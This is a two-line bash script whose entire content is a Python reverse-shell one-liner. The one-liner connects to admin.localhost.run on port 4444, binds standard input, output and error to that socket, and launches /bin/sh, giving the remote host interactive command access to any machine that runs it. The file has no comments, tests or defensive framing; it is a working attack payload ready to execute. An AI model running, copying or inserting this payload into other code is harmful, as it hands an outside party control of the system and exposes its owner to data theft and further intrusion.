#!/bin/bash 
python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("admin.localhost.run",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh"])'
